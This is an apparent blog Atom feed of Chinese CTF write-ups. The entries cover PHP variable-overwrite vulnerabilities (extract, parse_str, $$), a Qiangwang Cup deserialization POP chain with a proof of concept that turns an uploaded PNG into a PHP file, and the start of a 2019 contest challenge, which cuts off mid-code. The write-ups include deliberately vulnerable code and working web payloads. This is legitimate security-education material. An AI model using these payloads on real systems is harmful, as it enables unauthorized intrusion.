<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>42&#39;s Blog</title>
  
  <subtitle>Do not go gentle into that good night.&lt;br&gt; Old age should burn and rave at close of the day.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-06T12:18:21.877Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>42</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP变量覆盖</title>
    <link href="http://yoursite.com/2019/06/07/phpbianlfugai/"/>
    <id>http://yoursite.com/2019/06/07/phpbianlfugai/</id>
    <published>2019-06-07T03:32:02.214Z</published>
    <updated>2019-09-06T12:18:21.877Z</updated>
    
    <content type="html"><![CDATA[<p><strong>①foreach+$$可变变量覆盖</strong></p><a id="more"></a><ul><li><p>引入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">123</span>;</span><br><span class="line">    $<span class="number">123</span> = <span class="number">456</span>;</span><br><span class="line">    <span class="keyword">echo</span>  $&#123;$a&#125;  ==&gt; <span class="number">456</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>example：</p></li></ul><p><img src="http://wx3.sinaimg.cn/mw690/007b2muugy1g3sfq22ni4j30bz0a2dkj.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> error_reporting(<span class="number">0</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); <span class="comment">// show_source — 别名 highlight_file() 使用PHP内置的语法高亮器所定义的颜色，打印输出或者返回 filename 文件中语法高亮版本的代码。 </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>; </span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>; </span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>) </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"CISPCTF is here :p..."</span>); </span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) ) </span><br><span class="line">    <span class="keyword">die</span>($_403); </span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&amp;gt; $value)&#123; <span class="comment">//通过for循环遍历GET方式传入的参数变量与其值，ex：?_200=flag</span></span><br><span class="line">   $$key = $$value; <span class="comment">//如上ex的GET传入，由于使用了可变变量，在此就变为“$_200=$flag”,即覆盖了变量$_200原有的值：“Welcome Admin”，将$flag变量里的值存入了变量$_200</span></span><br><span class="line">   print_r($$key); </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"------"</span>; </span><br><span class="line">   print_r($$value); </span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&amp;gt; $value)&#123; <span class="comment">//通过for循环遍历post接受的参数，ex：post=&gt;flag=123, 此时</span></span><br><span class="line">   $$key = $value; <span class="comment">//如上ex的POST传入，由于使用可变变量，变为$flag=123, 即flag变量原有的值已被覆盖为123，所以下方27行的if语句判断始终全等，无法进入die($_403)语句</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag ) <span class="comment">// !== 不全等（完全不同） $x !== $y 如果 $x 不等于 $y，或它们类型不相同，则返回 true。 </span></span><br><span class="line">    <span class="keyword">die</span>($_403); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>; <span class="comment">//之后走到这里。flag原本值已经被覆盖。，echo出来的flag只是之前覆盖的123</span></span><br><span class="line"><span class="keyword">die</span>($_200); <span class="comment">//最后走到这里，真正flag的值在14行 被赋值给了变量$_200,  故此条语句打印出了真正的flag。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><br><p><strong>②extract()函数导致的变量覆盖漏洞</strong></p><ul><li>引入：由于未系统学习php，看了一些参考后，对extract()函数的理解还不是很透 彻。。。  但大致可以利用extract($_GET/$_POST)函数来实现将GET或POST的变量名与其对应的值传入；漏洞就发生在若用户传入的变量名与已有变量相同，则用户传入的变量名与其值会将原有的值覆盖造成变量覆盖漏洞。</li></ul><ul><li>example1：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);<span class="comment">//通过extract()函数将将用户通过GET写入的变量名与其对应的值传入。</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($gift)) &#123;</span><br><span class="line">    $content = trim(file_get_contents($flag));</span><br><span class="line">    <span class="keyword">if</span> ($gift == $content) &#123;<span class="comment">//要判断变量gift与content相等，由于extract函数的使用，直接通过get方式传入这两个变量并都赋值为空即可达到变量覆盖以实现相等的目的。</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hctf&#123;…&#125;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Oh..'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>PAYLOAD</em>：?gift=&amp;flag=<br><br></p><ul><li>example2：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == “POST”) &#123; <span class="meta">?&gt;</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123; </span><br><span class="line">         <span class="keyword">echo</span> $theflag; </span><br><span class="line">&#125;  <span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//和上一题基本相同，用POST方式传入pass与thepasswod_123变量，并将其赋值为空以覆盖两个变量，使if判断语句为真。</span></span><br></pre></td></tr></table></figure><p><em>PAYLOAD</em>：POST==&gt;pass=&amp;thepassword_123=</p><hr><br><p><strong>③parse_str(string,array)函数导致的变量覆盖漏洞</strong></p><ul><li>引入：该函数用于解析给出的string字符串，并将其注册为变量，之后将变量存入array数组中，若未给出参数array则只注册变量（ex：parse_str(‘a=1&amp;b=2’);  echo $a; echo $b ），漏洞就发生在注册变量时不会检查变量是否已经存在，当变量名与已有变量名重复则会造成变量覆盖</li></ul><ul><li>example：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> (<span class="string">'flag.php'</span>);</span><br><span class="line">    $a = <span class="string">"www.OPENCTF.com"</span>;</span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    @parse_str($id);<span class="comment">//通过parse_str()函数处理GET方式传入的变量id，会在此时解析变量id所代表的字符串，并直接将字符串中的变量进行注册</span></span><br><span class="line">    <span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;<span class="comment">//此时出现变量a[0]，结合上面的parse_str函数，可以利用id来将a[0]变量注册，并根据md5的0e漏洞赋给a[0]一个md5编码后为0e开头的值，这样就可以使if语句判断为真。</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'其实很简单其实并不难！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><br><p><strong>④import_requests_variables函数导致的变量覆盖漏洞</strong></p><ul><li>引入：此函数可以直接将GET/POST/Cookie的参数注册成变量，所以变量覆盖就显而易见了。</li></ul><hr><br><p><strong>⑤小结：</strong></p><p>变量覆盖漏洞其实都大同小异，无非就是通过GET或POST传入一些参数，经过上述几个函数的处理，将这些参数解析为了PHP中的变量，若已给出的参数名与已有的变量名相同，则会将变量的值直接覆盖。另外，在实战中，变量覆盖漏洞要考虑的不仅仅是变量覆盖，还要结合后续代码来真正利用起来这个漏洞</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;①foreach+$$可变变量覆盖&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP变量覆盖" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯CTF</title>
    <link href="http://yoursite.com/2019/06/06/2019qiangwang/"/>
    <id>http://yoursite.com/2019/06/06/2019qiangwang/</id>
    <published>2019-06-06T09:45:26.790Z</published>
    <updated>2019-06-07T02:11:31.634Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>WEB-1 Upload（简化）</em></strong></p><a id="more"></a><p><em>index.php</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'re.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ff;</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'hahaha'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'hacked by jiahaoqiu'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">guapi</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;ff)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;ff-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="comment">#echo 123;</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'hacked by jiahaoqiu  12345'</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ff)</span><br><span class="line">                &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">'ssss'</span>;</span><br><span class="line">                       <span class="keyword">$this</span>-&gt;ff-&gt;index();</span><br><span class="line">                &#125;</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$fan = $_GET[<span class="string">'a'</span>];</span><br><span class="line">unserialize(base64_decode($fan));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><p><em>re.php</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">        <span class="keyword">public</span> $filename;</span><br><span class="line">        <span class="keyword">public</span> $ext;</span><br><span class="line">        <span class="comment">#public $img;</span></span><br><span class="line">        <span class="keyword">public</span> $arr;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hackded by jiahaoqiu"</span>;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                    @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                    @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                    <span class="comment">#$this-&gt;img="$this-&gt;filename";</span></span><br><span class="line">                    <span class="comment">#echo $thi-&gt;img;</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'2'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;arr[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hacked by 1"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx4.sinaimg.cn/mw690/007b2muugy1g3rkxbk79hj30ez03c0ta.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>本题目的是将文件夹中的<code>2.png</code>文件改为<code>2.php</code>，审计源码index.php第17行发现<code>upload函数</code>中第二个分支语句可利用，只要控制<code>filename</code>与<code>filename_tmp</code>属性即可达到将2.png替换为2.php的目的，而要利用upload函数就需要进观察。</p><hr><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx1.sinaimg.cn/mw690/007b2muugy1g3rkxem04vj30bz04sq3f.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>做题时还是会最先考虑利用题目中很显眼的<code>__Call</code>与<code>__Get</code>两个魔术方法，发现<code>__Call函数</code>中：<br>其中<code>$arguments</code>便是函数形参，可以利用此行语句来执行<code>upload()</code>。想要利用<code>__Call函数</code>就需要调用该类中不存在的方法；并且，再调用__Call函数时，形参<code>$name</code>即为被调用的那个不存在的方法的名称；</p><p>而<code>__Get函数</code>的利用需要调用该类中不存在的属性，此时再看<code>__Call函数</code>中的<code>if($this-&gt;{$name})</code>，竟然用形参<code>$name</code> 这个该类中不存在的方法做判断条件，那么当调用这个与不存在的方法同名的属性时，__Get函数便会执行，从而进入 <code>return $this-&gt;arr[$name]</code>  语句，所以当我们控制arr数组中下标为<code>$name</code>的值时便可控制return的返回值，即将<code>$this-&gt;{$name}</code>变为我们指定的 arr[$name]的值，结合前面要利用upload函数，将arr[$name]的值变为upload，即可将<code>$this-&gt;{$this-&gt;{$name}}($arguments)</code><br>变为执行<code>$this-&gt;upload()</code>;</p><hr><br><p><img src="http://wx3.sinaimg.cn/mw690/007b2muugy1g3rkxggohuj30cc05oq37.jpg" alt></p><p>如上，开始构造完整的序列化攻击链，首先要调用upload函数就需要调用<strong>Call函数，发现可以利用<code>$this-&gt;ff-&gt;index()</code>，将register类中的ff属性赋为aa类，这样就能是aa类调用其不存在的方法“index（）”，从而调用</strong>Call函数，在执行<strong>Call函数时，其中的<code>if($this-&gt;{$name})</code>即变为<br><code>if($this-&gt;index)</code>，而aa类中又不存在index这个属性，所以会进而调用</strong>Get函数，我们再令<strong>Get函数中的arr[index]的值为upload，使</strong> Get函数最终将“upload“ return给<code>$this-&gt;{$name}</code>，便可通过<br><code>$this-&gt;{$this-&gt;{$name}}($arguments)</code>执行<code>$this-&gt;upload()</code>；</p><hr><br><p><strong><em>POC:</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> aa();</span><br><span class="line"> </span><br><span class="line">$reg = <span class="keyword">new</span> register();</span><br><span class="line">$reg -&gt; ff = $a;</span><br><span class="line"> </span><br><span class="line">$a -&gt; arr = <span class="keyword">array</span>(<span class="string">''</span>index =&gt; <span class="string">'upload'</span>);</span><br><span class="line">$a -&gt; filename_tmp = <span class="string">'2.png'</span>;</span><br><span class="line">$a -&gt; filename = <span class="string">'2.php'</span>;</span><br><span class="line">$a -&gt; ext = <span class="string">'1'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;em&gt;WEB-1 Upload（简化）&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛CTF</title>
    <link href="http://yoursite.com/2019/06/06/2019guosai/"/>
    <id>http://yoursite.com/2019/06/06/2019guosai/</id>
    <published>2019-06-06T09:12:23.164Z</published>
    <updated>2019-06-07T02:08:51.371Z</updated>
    
    <content type="html"><![CDATA[<p><strong>WEB-1 justSoso</strong></p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">@<span class="keyword">include</span> ($file);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($payload)) &#123;</span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span> ($query as $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>, $value)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>index.php</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking upn"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="function"><span 